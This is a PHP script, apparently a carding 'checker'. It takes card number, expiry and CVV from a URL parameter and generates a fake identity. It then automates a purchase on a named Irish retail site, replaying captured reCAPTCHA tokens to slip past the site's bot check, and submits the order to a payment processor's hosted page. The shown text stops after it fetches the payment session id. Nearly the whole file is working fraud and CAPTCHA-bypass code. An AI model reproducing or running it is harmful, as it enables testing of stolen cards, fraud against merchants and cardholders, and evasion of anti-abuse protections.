<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://www.eddiemurphy.ie/basket-detail/add/?mzitmcode=0000004840169&mzitmqty=1&mzcurrentListID=&mz_ProdConfigOn=no",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    )); 
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.eddiemurphy.ie/checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $labFormSubmitted_UniqueID = GetStr(curl_exec($ch), "<input name='labFormSubmitted_UniqueID' id='labFormSubmitted_UniqueID' type='hidden' value='", "'");
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.eddiemurphy.ie/checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mzSearchTerm=&labFormSubmitted=yes&labFormSubmitted_UniqueID=$labFormSubmitted_UniqueID&labInputemail=$cookie@gmail.com&labInputpassword="
    ));
    curl_exec($ch);
    curl_close($ch);

    $anchor_link = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ&co=aHR0cHM6Ly93d3cuZWRkaWVtdXJwaHkuaWU6NDQz&hl=en&v=bfvuz6tShG5aoZp4K4zPVf5t&size=invisible&cb=o8yam1hsicfc';
    $reload_link = 'https://www.google.com/recaptcha/api2/reload?k=6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ'; // It looks like: reload?k=
    $v   = 'bfvuz6tShG5aoZp4K4zPVf5t';  // Available in Anchor Query String Parameters
    $k   = '6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ';  // Available in Anchor Query String Parameters
    $co  = 'aHR0cHM6Ly93d3cuZWRkaWVtdXJwaHkuaWU6NDQz';  // Available in Anchor Query String Parameters
    $chr = urlencode('[90,35,46]');  // Available in Reload's Request Payload (Post Field) and looks like: [21,71,92]
    $bg  = '!DwmgCUTIAAYe7ljdHu5Hl6PoRnnAyH8-ACkAIwj8Rk5bW8-rI9Y9stpyl1l1asv1BlQKIK-J56_xScqu8SbmzCNsNwcAAACMVwAAAARtAQecCjkf61i-xzWuYDFl0nsOGY7v73S72fNXtOc7hOCRzAh3-rQfBI0RE36R3zs9srytFGwJVFBFTqU62INaMQP2JI6-vcnfPPe3m0RlJJli1yviJJCvPXHZNcCBKQGdK8Ujyq0ZBtWYjAIWckjRlMADt4BGQ694XrwLkdOcwf_PXxWPsqAk6oz9GsHbemjQaxFrhrHFrtQfZS0XqNrq0LO9O-GG59XAkEIMCTFKnWLFTRJggppjjpdC8iFyZavc6AV5cMi4krGweRn6u4OGsGam7lEAmYAmWKzv5qE8vGxaXHdvUyWRxedsCKRtsgFgW_mxTxLnHkd1meJxvfHQsMqegATXJCt1SiJupbOg0pS8AvWdDqdKIf5_17Z4mKR1UHlZpvaXsDELCz3ZLn9-7EnozngEnq9huOJiR4a62nC-2rw2DSATMSrOvE8zqqpHY4rtWYWQPJYV9YoerZo68mO86o_XyNWzGtiH8_0M9B9R7nT87L19dvzTpqOyTlHwvYqU44FdlIei5O08dmMFlhrmLo3Kw-vLdBrldC2xBCgBaSsYd3xzwL1XuPd3iKqxzIX3vVGlormdm6kz2d3SuePKfmB_ozliGz6ZRR1bSe45UjRpSQZN6BQ3Kvt-1FZ8X5mZoKfpi40SXJYO5OZAdVI-mYi_5L9ccAEhcDfiHC16u5qzIuERp8xUEKuar4yrhdkL34Qpe7f6FpAy73NQDZuRH38Rk6RXfZu1KDBHvthia2VHirx0ffOgly3uMQURUhnNdW1aE2Tu6mDJ1Q41P_mIq6RMBYaVbLQzGjkG0mgoqebVKGTgQoNysiVoVf40vL8E70t_QzpAKGO2Kq4Ua--8vlOse70h4AfDtup0z36u96li-kAEZzg5ax4LD1oGukoD1pXgn8lZgPO4Rve2OmBvBQm77ZLLns5c5kgg37b3jf6DQrS5cBsPhvEBehL03Q2BjoxH9f2GLOiUSNXxeX25SIjjHDdIZxAo5vTH5bpdljM25ZGUELNJ3eNMy-ti41-2JVQYA5tSRAte7q4Y4adyHzQ0xA8F857TnVs88h4HNnYHy3beadqBiJwaH_H1PIw8Q_A_qv9cfDeboULP23J8ZEY8uyPNMVtc003KIKaIorQg1u0QJGdFgtZiiWTtCW_M8cxPlJbTxiLfaL1ahGHIOu9Vi7cRxOWpu_C-Z2Tw0EGFdAv_Z62snxiDgdPBcXCyUuhiXtpFEMJ392SQxgq2SvFg4cbCTy9xM-BG2PPEeXmetMrJ9moMBKJpChyiocuEgaIMYznNi41IOTtijgetiAWWaBP9JqyDgsBEy1pkAIhUWsk90YM29J0cmEtXWzLZFnWX8qW1KPzPv4cFM3boFHfW95xYFJzkol6R-Eu9TZwJoM3_dIxuDOyG-vj6CtETXK5vZ_MTIDPSnWl_I6VKVlcrTOep4F3sXi1aptW2lqFFXp-DAaRIbD5w12pCEJ1V6U5ZmsrDlYmSI0n1P39K_PgofkcxsZigNZgAVF5O0yq6_-cQA5cwbj06IcwxOqZdtbxKzithCwSfdHgwL7zg6Ose3c4gyL743hl0gilTcrcLZdF455batU03yjzTk6khmgirxUPvI-2L9YD-lhIppUic-HN_Zj2Dh-eHDb343Zic-ttYzOzhunV71FFJVssU1Y_mymvrDV6sqlTF0WlcpUaHiwYSYLBHItIGj5MJzrRRh8N5r_1IdNHX1GtL6qnUFAKfExDUNySF7MxkA5HiYqNSbpZ6Vxkz3BYle-67pUVrPtDShFDbH2sVCepJbkI5LYvRjuELmzemXfAuGjYUeBMp2hNR7adpfa0mHYlLouwFfzKBr2FflBmrnCIcE9cRc2BmTXDOmNjD_Pmr77hph5hX64z2jiTPAeZPAI8FWh9fwtnoprbtdcxHOYnfIwubachapCjE0n6xXgpagWAOHf4n6XfdqXM6Wr2YHcYfoqyKfWqhhXesi-B5XXecFcRsltTp2-Z59t7iQDnms7W9p6vB5RRJC8ng1ZMFoQMhG-D2nsSS6Q8z5OS_faPVWVtkpmKBCAyHN28jS0a3HMFghq1qdI7gskdrUYlXcW9Hztmbadhxo-fLVicqLT66iRWbNDQIStxSVhLxT9CrJd0WZrjcuReqdeC29RdLp3dIFcvCBOiplMpLQNv9SGQwAIzLyL95WQBUW8u69U55CUtW-hReb9JmTedGa1rlNad-VmdCx4kLVQs3KsKf7pJl174kb1rn2LFWRfGq_XmTmUPc4NeG0M2ieNadB4i55GWeJmSxJuRx5Uda4o1mebHzmj6m_RlBpge6-9NXRl8VBgu28-jHId5T3E8ZA76F0cefeL0U3hHOnvLD-qgJbnePc5GQTp9u63y8pV2Wx9YTOgOfbMG5PFCXcaC3hbLsazSNCZkA-5YTWllcuh2uhSBj7csAlscennwISQojfi_BE4djgbODb3_Ng-b9eByyCsfWYaaL3jheFz-SnFutZTgLwnI9lmDm8DsDkyCT_34x0pugIxp-yRfrdW-pXXOWCXPrzno3DnHJ2Jm-98Mxggw9STGpGOhMmXHbn_yo4ITnFC2K7xiKLE47b5Y-LaJBix2-0Y6A_nV4jwphQ3I1oUqLu6k_XkDkeNdQXQ292Xt57hIOWDS5fhUKU4267e-JxSTuhHGA6r2O03xY1WYg7noeq4zDQOOnufAwRidMDUmWF4lRUtFeF9YDQPyF40TAUZzyJroUcmXDscPflTaTRwRGFo5kQQIJnIxHQTB20Gddb09LbUWquDbFNSNns0OTLmfKBiXn3CKq_x2ovfgSH18N_EtK4WVyv5ihEq8G9zYJkhMyA5pGcdfT2AIbmE6Zovkg-dlyectBM0cI6WYaQpbUNludSaRy2qvfgAHH3g_VB27WnxzrN0QJykKFpJAVCAyxztG7cC7TyvqkH_Q5Z6finn7KosDO2kiH24o-CxoTr4tteIWz6KoKNS353IxesNZiEBcZ_i4pw8_FvBe1oscSJ4Ms1le_m8PtWxSGkXvZxxQE2KetOrI-KWH5Elp0phoaJ0QDj6CmpiieYFedrZuvrcISdMFYRursqpbpEIO6ZtVOZLLCb4V56Asg5pxjaJ2OdIEVOD4lQDzHf3DfUWWIHoFIgGbri1zem552F-wx3fJc7Okz5gTzPihfGnIJj0PLuFnPFMNRWE5Df_fnGEOldltarZMdfHNJY0REUoY50j-dfhke17-zKIhhupAgnYAJ0MiSnutmMiI4Aj3B1s8FocE_ucybkZLuHRH_TU4JBdfY80WmvP_lAuFXyNpQq24XQ9vz8e4GR3hVTpD3hhi4sWUQoVZsqS3sVIjIeHE8bBYRBV4piQPYzGItnXlHham93j8do_xZWQyJo8p01VT_LVmMuUxzjJYO9eX312rRiDPLje8ZYHTt1b9PznLTCctfmY48StzJ9kYALOMSd5XJjZsI6LCzbHy_w77mWTsrCnXEkiiPjsY5x_ylit5-';  // Available in Reload's Request Payload and is after the $chr and it starts from ! and ends with * (Exclude *)
    $vh  = '-174138212';  // Available in Reload's Request Payload and is after the $bg and select only the number (Sometimes - sign is also included in number, you have to take that - sign also)

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $anchor_link,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99)
        )
    ));
    $rtk = GetStr(curl_exec($ch), 'type="hidden" id="recaptcha-token" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $reload_link,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99)
        ),
        CURLOPT_POSTFIELDS => "v=$v&reason=q&c=$rtk&k=$k&co=$co&hl=en&size=invisible&chr=$chr&vh=$vh&bg=$bg"
    ));
    $captcha = GetStr(curl_exec($ch), '"rresp","', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.eddiemurphy.ie/checkout/delivery/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=$captcha&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mzSearchTerm=&labFormSubmitted=yes&labFormSubmitted_UniqueID=$labFormSubmitted_UniqueID&delColl=storeColl&labInputShippingFirstName=&labInputShippingLastName=&labInputShippingPhoneDay=&labInputShippingAddress1=&labInputShippingAddress2=&labInputShippingAddress3=&labInputShippingAddress4=&labInputShippingAddressPostCode=&labInputComments=&collectionoutletid=&labInputCollectFirstName=$fname&labInputCollectLastName=$lname&labInputCollectPhoneDay=$phone&mz_ordTerms=on"
    ));
    $collectionOutlet = GetStr(curl_exec($ch), '<a href="#" class="formBtn_reg" data-outletid="', '"');
    curl_close($ch);

    $anchor_link2 = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ&co=aHR0cHM6Ly93d3cuZWRkaWVtdXJwaHkuaWU6NDQz&hl=en&v=bfvuz6tShG5aoZp4K4zPVf5t&size=invisible&cb=lzcrgkrv8glw';
    $reload_link2 = 'https://www.google.com/recaptcha/api2/reload?k=6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ'; // It looks like: reload?k=
    $v   = 'bfvuz6tShG5aoZp4K4zPVf5t';  // Available in Anchor Query String Parameters
    $k   = '6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ';  // Available in Anchor Query String Parameters
    $co  = 'aHR0cHM6Ly93d3cuZWRkaWVtdXJwaHkuaWU6NDQz';  // Available in Anchor Query String Parameters
    $chr = urlencode('[56,97,27]');  // Available in Reload's Request Payload (Post Field) and looks like: [21,71,92]
    $bg  = '!TkigSAXIAAYe7ljdHu5HGziGcx-5HDc-ACkAIwj8Rl_Yv2hcQ3HpCKRYeZB4AP67kFnEXtaKZd_llegvx1HWUXaGNwcAAACNVwAAAAVtAQecCxF4WAu9DnyrSj1T5mOubg1gHpP0i6BVDLEmkOHFjQ86z4YKyXLDHOC9BhyMgk8EMY_xbKP1XnplmtSWBlSSZQXwGpEXYmR0ReWyv6xKFvVUmuq6_otK9tRCSY0zIQZRHFz5S-BcAOK1ZkxW6a-em1rgcPpzyJa1j1T9fFSCv_rrYdMp1Rc4OXLbfVcV_0fpU0kyqbX1b_kZX-TavS7vAK1C3XujrNjS-K1HnA6HsFgCKIxH_K3M15Q1vCaFqB9UsWH0Dys1Hc2tvFC3BimzLxbIBSQpBs6rPjS_oup9X0m7OcQAeiP_G57Bft9AONNTDrOJVJKliKd-vmCY2IpVdpiNsC1l5GccasSrE2ch0WhV1930XrpD2dcO3JpG0VYUu5GhGfU_dk4v1ZWcjPH8St6kyzxQiBwJ7Io6pIwu6d4s0fDD-7NRoFcxWW4UALvrtgQLiym7bF-Gbd4D5WgkO1Y2sb1HuTRCVazJcdpgzidT6OuPewySA6LrK33GYfZDO_tecd2ZN6_q5fo048zQdYCnbhCn1LV57xlk1qG8vTq6F0koBFS7nLIidpTV8C0ujMv5hOdksSMJApZg0CYqqjATelnmummhHK1KM499pubyenfFotklPHAk2gT37XK0S1ZeAE1FmygypUIUPt2s1gc9xcGWBZS2L4OuE_7dsifK81-7XrhjQBxV20CHmsbUJXKhMCSYeeSOVNCSuNMWrXUmM4JUwd7R0O1Yrk81ajBWuXt92MX9pp60x6P50d9b7rXwS6QOuZhZ9Z10aylsqYy-P5HuySIHJG0UUnzC_-FviSKGgywTUil2rX8V5KyjToy1isc9ubvDc1ZbXs4TQWYtympDFZmu-sFcNxAJd1pa8C91f9Dhrq1UoolgVtCB-pgF53JaZ4PXsSm6SlRROZSKj5zWeJlga5EAeqDQWPxgZPOGy85Ib-DH4UvhDiOmSSVQOlLaDeSq_HQ1VVcsI-gb_8Bt8QClBDlZFshFyWbMASawiiV9OgLx8GaMwD29MyOrFPneTh7A80o5ZjqApoMLIEGBTDApcHcvI2j6SzU3HAxfskIYwYq8-nRFj6w-_DwtXb91wyGJJqWZ983WFehQbkb30T9U4v1UzEb062xZwWrtghbhMQ9hfKAawyhJ_nxTmWjmwC4ZQCNQ0ST06mGQe5mTvijbcMun8xK24jBNsAaHJAUj6mBY2QJdNw6Pt3LX9qJS2iNlzrnYDKlQnLHUsPC7DiQ8c4a1fRgjkjHxVL2tf8fBaUZLZFGWdo_OKqKtn7nCVYGk1r4VZNYC0C5F7eu8tYIwRKGeT1G1pSDbe_DErzBYGgjh62f1_1uNh4i2x6hWweLaBsySjCeyc8rtJGALsSf5LE1zVd_e0vacMZwb7ZVVnlOxOhK9DLMya_rlm8ETrRwCYYOHhVGoeT1OURHVEbneH_r8nQxbGJOZt-MbnbK9oBAP_S5uodLE9OrybbC8M9EznQ55k21Qn4iGOgYHMMMe52dEYz9EJ15aUm_tnmsYYnNnJeIxKsCwfH48eFwAVv0R1myjW3reHxkZakqzmjwrdW69RElvMZr87cGA9gTMW1KQafFXFWapxWMhqabUFSTTQS8bS66yH5rrPZubc_t2PnG3tOXUGQXYqd0c9oqtpAtB5DmAdFFRppMXL_Xmy_xqo2y2m2Zia2KJ-Wct7YQ8ZZ8QC8f2buLWqmzFANkYoj-LwPUcFgq8hWsXs4AFfZJ3w5j2lvzjB0Uc7Wn-KJxktwlKUounZrnjj0dQ5x3gApLeMxnZgbnXzOr6QnlKWP3LTVmbw_BmU1I_kTwDSkhg5LkKoVPz1j5hNUvY0pAeUoHlG0baWnBkr5nCQO4Z-reAJH86cUi6FUWGaRyksF8d6TCSetJNJlZtCfTrPLoxqWTa0YkipIsRDvykVikM6pV_rl4OryCqvRTFncH7GTC0YqW4dmyBlUrUuJ1X3cdKpGCLRgkiO7bTrT5nCRYUxGKvUrjmkZSKT_UF81CCaNlBV_tR2cDFS5p_BJqlhVDOUFocizgZGnXyEK_PlLmXxJ1vkD3WMw8gUtJZLTMRSD1Dh7fvUQ7fx7vg1o5Vzho_Mf8Am_TBIW3EM3hc8wMfK2XXyzjidbymZRDUGUXruVpD_H3tWXemHjxwHredD_pPb95gtTjmfchkflm28bcc6PFEfL2vL1y_59Mp_7tpp9kumnJfWskATjTrrec8ZNWpbcmGqS6m6wEunjGC_Chz1gsSpgjbsDFZYAQbXHJgLp8XzpXTM46mGzYAP4Ik_aZ1LAMk0zHmq6qx6TOnjtMG3bfgvRUf4jAClCtuBAsb-40lB1878HOIYq569_Cu5vOu9oaeuJNhRKKE_idieYI4b38lBdwNeg5F4LeHRZBHbE0WCdKlQKjd7ZPR5gXxNOgsmB5iprBly-j91MD7tVEfrvcJTyu2Yot_ytiEi5yjIE-MlUgdqOC_C9nBBaNaBFmbXAIsG9ldS2CglU5qvBIdt0qZOrnAFnpCF26CQlrEPf06A6MLIzKkeOB5x_KTSLpuwxsopAMTF_n2NA0XxZHGrUFxtcJe5Jb0Q5SwMOSna5O3o_HadkVkRmL-eXZ6ZUER7t_wBJidL47mxzZh5kf51okxqZUgh_K_dt0krUw8MB_7z7POlndeKyps-XQGNrIxXmcOLdklWQz64At9obm2fv1TNpg1EBkPp-11GfCMscbDhDfYm8IaplyDCx6CYpJuOjDzfi62hH2dmJjcySo7s7nvSB_wONwC4bcyByu1zlyoMtvAr2cv1UuzS92Y-lMJwv03HDV6NwSm8vC7oQca1KIzoNmZEfFgKArhz2TfpGh7oXvmN5e-3CrWs_gMs7Z_GhSOcwAPXK3TY5l_WGnRpWHkVn0k4cKrHkzzDq9KBrs4luJzx-XtlcXoKmPUF5I9zwAHsM-P9RJqFfaLNOjl4f-g7iPPoJPNqZreoStYbF2Bo7NUXGmtqQ6AAxOfPltHGu2f4ykCL3HTBFoGFc-QvGlq9XT17hiRiR4-4MjiCgtQXSYsV07SOSfi-0yyIyHsjLlIkbNJhlU_4cgafW4KCZ3unXO3pNEw0qArQLPcTgjtkS37rkS0WIkmy_pB9vIZIBgHdghThRPBY98rZgseVWdNfY7pfJ22rurduzKsd3O32-r0uGvf7NKxPvtrF2K-7OJEJgUqiMzdObtAIZE9KD8Bg120w1UpCVcRGNP_GoLZUkzGRj7POHGC8n4_tBYIBqAt27YtJ7E5uh8w0MmLSmllHzfWzDFjydQoobgCMBMi2hF-WAKZGHhipUMmVFb6G94WJQO-yg2UGRLHYCOApJ4AXHee5T6Me-xqyYQ5mfKto03KOumTvaF6ZP48ZDagBheA9zmJXYHY1E1fVg3GjuJ7_V-6wUGoQ1uS55h6UlPrB9XWRgs_vg0MzJoPms0u9S5M-lwABJyuAz9Dawl6vPBZ_79ziYu9ML7FErnlB1NQLs1BlhQuU4ISEvz2xqkEFRHYDbNNlIo9YOF53r_xPjVgjklshLUGD4a6195Q3Sx8EjAAQjUq8xqQCExCJJaeL3XJPp3uodaZu1U35x-xNyJpknirYT1MOtMZgwBc0IpEAGZTXWMrCokfh9Fk2pHZfjb79iGkkmGnl3RdSfk0ezPGWNTyFQ75BlsS9jP-Xc2jaxR5o4w_MExqLNCPbq0cDtg1IDjiIFFpWld2cciG4B63jbatGrbt8pqKWcoA3BRFcAxqVsIqpBKqMO_rpBGN0CzuUzrsFvwn-BD5';  // Available in Reload's Request Payload and is after the $chr and it starts from ! and ends with * (Exclude *)
    $vh  = '-4438589742';  // Available in Reload's Request Payload and is after the $bg and select only the number (Sometimes - sign is also included in number, you have to take that - sign also)

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $anchor_link2,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99)
        )
    ));
    $rtk2 = GetStr(curl_exec($ch), 'type="hidden" id="recaptcha-token" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $reload_link2,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99)
        ),
        CURLOPT_POSTFIELDS => "v=$v&reason=q&c=$rtk2&k=$k&co=$co&hl=en&size=invisible&chr=$chr&vh=$vh&bg=$bg"
    ));
    $captcha2 = GetStr(curl_exec($ch), '"rresp","', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.eddiemurphy.ie/checkout/delivery/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=$captcha2&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mzSearchTerm=&labFormSubmitted=yes&labFormSubmitted_UniqueID=846f446b-2800-4b61-b978-2cb3c93a8e43&delColl=storeColl&labInputShippingFirstName=&labInputShippingLastName=&labInputShippingPhoneDay=&labInputShippingAddress1=&labInputShippingAddress2=&labInputShippingAddress3=&labInputShippingAddress4=&labInputShippingAddressPostCode=&labInputComments=&collectionoutletid=$collectionOutlet&labInputCollectFirstName=$fname&labInputCollectLastName=$lname&labInputCollectPhoneDay=$phone&mz_ordTerms=on"
    ));
    $lastUniqueID = GetStr(curl_exec($ch), "<input name='labFormSubmitted_UniqueID' id='labFormSubmitted_UniqueID' type='hidden' value='", "'");
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.eddiemurphy.ie/checkout/billing/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mzSearchTerm=&labFormSubmitted=yes&labFormSubmitted_UniqueID=$lastUniqueID&labInputBillingFirstName=$fname&labInputBillingLastName=$lname&labInputBillingAddress1=$street&labInputBillingAddress2=&labInputBillingAddress3=$city&labInputBillingAddress4=&labInputBillingAddressPostCode=$postcode&labInputShippingRegionDecode=United+States+of+America+%28USA%29"
    ));
    foreach(explode("<input type=\"hidden\"", GetStr(curl_exec($ch), '<iframe id="globalpaymentshppframe" name="globalpaymentshppframe"', '<script type="text/javascript">')) as $values){
        $form[GetStr($values, 'name="','"')] = GetStr($values, 'value="','"');
    }
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/pay',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.eddiemurphy.ie',
            'Referer: https://www.eddiemurphy.ie/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mzSearchTerm=&".http_build_query($form)
    ));
    $guid = GetStr(curl_exec($ch), "https://pay.realexpayments.com/card.html?guid=", "\r\n");
